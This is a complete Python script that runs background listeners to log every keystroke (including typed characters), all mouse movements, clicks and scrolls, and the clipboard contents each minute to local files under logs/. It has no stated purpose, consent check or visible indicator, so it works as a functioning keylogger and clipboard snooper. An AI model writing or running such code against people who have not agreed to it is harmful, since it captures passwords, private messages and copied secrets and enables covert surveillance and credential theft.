import logging
import time
from pynput import mouse, keyboard
import pyperclip

def createLogger(loggerName, logTo, formatter):
    logger = logging.getLogger(loggerName)
    logger.setLevel(logging.INFO)
    handler = logging.FileHandler(logTo)
    handler.setFormatter(formatter)
    logger.addHandler(handler)
    return logger

def on_move(x, y):
    mLogger.info(f"Mouse moved to ({x}, {y})")

def on_click(x, y, button, pressed):
    if pressed:
        mLogger.info(f"{button} pressed at ({x}, {y})")
    else:
        mLogger.info(f"{button} released at ({x}, {y})")

def on_scroll(x, y, _, dy):
    if dy < 0:
        moveVertical = "down"
    else:
        moveVertical = "up"

    mLogger.info(f"Mouse scrolled at ({x} {y}), moved {moveVertical}") 

def on_press(key):
    try:
        kLogger.info(f"Alphanumeric key {key.char} pressed")
    except AttributeError:
        kLogger.info(f"Special key {key} pressed")

def on_release(key):
    kLogger.info(f"{key} released")

formatter = logging.Formatter("%(asctime)s - %(levelname)s - %(message)s", datefmt = "%Y-%m-%dT%H:%M:%S%z")

cLogger = createLogger("clipboardLogger", "logs/clipboard.log", formatter)

mLogger = createLogger("mouseLogger", "logs/mouse.log", formatter)

kLogger = createLogger("keyboardLogger", "logs/keyboard.log", formatter)

mouseListener = mouse.Listener(on_move = on_move, on_click = on_click, on_scroll = on_scroll)
mouseListener.start()

keyboardListener = keyboard.Listener(on_press = on_press, on_release = on_release)
keyboardListener.start()

counter = 0

while True:

    if counter % 60 == 0:
        data = pyperclip.paste()
        if data != "":
            cLogger.info(f"{data}") 
    
    counter += 1
    time.sleep(1)
